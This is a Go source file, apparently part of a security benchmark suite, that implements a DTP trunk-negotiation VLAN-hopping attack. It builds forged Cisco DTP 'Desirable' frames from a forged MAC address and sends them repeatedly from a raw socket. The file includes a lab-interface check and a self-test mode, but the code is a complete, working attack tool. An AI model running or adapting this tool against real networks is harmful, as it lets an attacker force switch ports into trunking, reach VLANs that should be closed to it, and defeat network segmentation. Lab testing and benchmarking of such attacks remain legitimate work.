package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"os"

	"github.com/rohanpunj/iolbox/tools/secbench-attacks-go/internal/attackcommon"
)

const (
	dtpHeaderLen = 1
	dtpTLVLen    = 4
)

func appendDTPTLV(packet []byte, typ, length uint16, value []byte) []byte {
	start := len(packet)
	packet = append(packet, make([]byte, dtpTLVLen+len(value))...)
	binary.BigEndian.PutUint16(packet[start:start+2], typ)
	binary.BigEndian.PutUint16(packet[start+2:start+4], length)
	copy(packet[start+4:], value)
	return packet
}

func buildDTP(myMAC net.HardwareAddr) ([]byte, error) {
	if len(myMAC) != 6 {
		return nil, fmt.Errorf("source MAC must contain six octets")
	}

	dtp := []byte{1} // DTP version
	dtp = appendDTPTLV(dtp, 1, 5, []byte{0})
	dtp = appendDTPTLV(dtp, 2, 5, []byte{3})
	dtp = appendDTPTLV(dtp, 3, 5, []byte{0xa5})
	dtp = appendDTPTLV(dtp, 4, 10, myMAC)

	llcLen := 3
	snapLen := 5
	dot3Len := llcLen + snapLen + len(dtp)
	frame := make([]byte, 14+dot3Len)
	copy(frame[0:6], net.HardwareAddr{0x01, 0x00, 0x0c, 0xcc, 0xcc, 0xcc})
	copy(frame[6:12], myMAC)
	binary.BigEndian.PutUint16(frame[12:14], uint16(dot3Len))
	frame[14] = 0xaa // LLC dsap
	frame[15] = 0xaa // LLC ssap
	frame[16] = 3    // LLC ctrl
	frame[17] = 0x00 // SNAP OUI 00:00:0c
	frame[18] = 0x00
	frame[19] = 0x0c
	binary.BigEndian.PutUint16(frame[20:22], 0x2004) // DTP
	copy(frame[22:], dtp)
	return frame, nil
}

func run() int {
	fs, common := attackcommon.BaseParser("DTP trunk negotiation hop (forge Desirable frames)")
	if err := fs.Parse(os.Args[1:]); err != nil {
		return 2
	}
	if err := attackcommon.EnforceLabIface(common.Iface); err != nil {
		attackcommon.Status("FATAL", err.Error())
		return 2
	}

	myMAC := attackcommon.ForgedMAC()
	frame, err := buildDTP(myMAC)
	if err != nil {
		attackcommon.Status("FATAL", fmt.Sprintf("DTP packet build failed: %v", err))
		return 1
	}
	if common.Selftest {
		attackcommon.SelftestOK("dtp_hop", fmt.Sprintf("DTP frame len=%d", len(frame)))
		return 0
	}

	sender, err := attackcommon.OpenRawSender(common.Iface)
	if err != nil {
		attackcommon.Status("FATAL", err.Error())
		return 1
	}
	defer sender.Close()

	_, err = attackcommon.RunLoop(common.Count, common.Interval, func(n int) error {
		frame, err := buildDTP(myMAC)
		if err != nil {
			return err
		}
		if err := sender.Send(frame); err != nil {
			return fmt.Errorf("send DTP frame: %w", err)
		}
		attackcommon.Status("SENT", fmt.Sprintf("DTP Desirable #%d from %s", n+1, myMAC.String()))
		return nil
	})
	if err != nil {
		attackcommon.Status("FATAL", err.Error())
		return 1
	}
	return 0
}

func main() {
	os.Exit(run())
}
